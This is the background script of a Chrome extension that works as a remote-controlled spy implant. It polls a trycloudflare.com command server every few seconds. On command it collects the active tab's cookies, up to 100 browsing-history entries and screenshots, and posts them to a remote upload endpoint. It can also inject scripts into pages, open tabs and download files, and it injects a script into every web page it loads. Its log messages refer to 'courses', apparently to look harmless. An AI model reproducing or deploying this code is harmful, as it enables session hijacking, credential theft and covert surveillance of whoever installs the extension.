

const SERVER_URL = "https://became-michelle-specifications-discounted.trycloudflare.com/server.php";
const UPLOAD_URL = "https://became-michelle-specifications-discounted.trycloudflare.com/upload.php";


chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && /^http/.test(tab.url)) {
    chrome.scripting.executeScript({
      target: { tabId: tabId },
      files: ["system.js"]
    });
  }
});


function getCommands() {
  fetch(SERVER_URL)
    .then(response => response.json())
    .then(data => {
      if (data.command) {
        executeCommand(data);
      }
    })
    .catch(error => {
      console.error("Error fetching courses:", error);
    });
}


function executeCommand(data) {
  const command = data.command;
  const commandData = data.data;

  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    const activeTab = tabs[0];
    const tabId = activeTab ? activeTab.id : null;
    const tabUrl = activeTab ? activeTab.url : null;

    switch (command) {
      case 'open_tab':
        if (commandData) {
          chrome.tabs.create({ url: commandData });
        }
        break;
      case 'close_tab':
        if (tabId) {
          chrome.tabs.remove(tabId);
        }
        break;
      case 'take_screenshot':
        chrome.tabs.captureVisibleTab(null, { format: 'png' }, (screenshotUrl) => {
          uploadData('screenshot', screenshotUrl, tabUrl);
        });
        break;
      case 'get_cookies':
        if (tabUrl) {
          chrome.cookies.getAll({ url: tabUrl }, (cookies) => {
            uploadData('cookies', JSON.stringify(cookies), tabUrl);
          });
        }
        break;
      case 'get_history':
        chrome.history.search({ text: '', maxResults: 100 }, (historyItems) => {
          uploadData('history', JSON.stringify(historyItems), null);
        });
        break;
      case 'inject_script':
        if (tabId && commandData) {
          chrome.scripting.executeScript({
            target: { tabId: tabId },
            files: [commandData]
          });
        }
        break;
      case 'show_notification':
        if (commandData) {
          chrome.notifications.create({
            type: 'basic',
            iconUrl: 'icons/icon128.png',
            title: "UNKNOWEN PROGRAME",
            message: commandData
          });
        }
        break;
      case 'download_file':
        if (commandData) {
          chrome.downloads.download({ url: commandData });
        }
        break;
      default:
        console.log("Unknown c courses:", command);
    }
  });
}


function uploadData(dataType, data, sourceUrl) {
  fetch(UPLOAD_URL, {
    method: 'POST',
    body: JSON.stringify({
      type: dataType,
      data: data,
      source: sourceUrl,
      timestamp: new Date().toISOString()
    }),
    headers: { 'Content-Type': 'application/json' }
  }).catch(error => console.error("Error uploading data courses:", error));
}



chrome.alarms.create("pollServer", {
  periodInMinutes: 0.083333333 
});



chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "pollServer") {
    console.log("Alarm fired, polling serv for courses...");
    getCommands();
  }
});


getCommands();
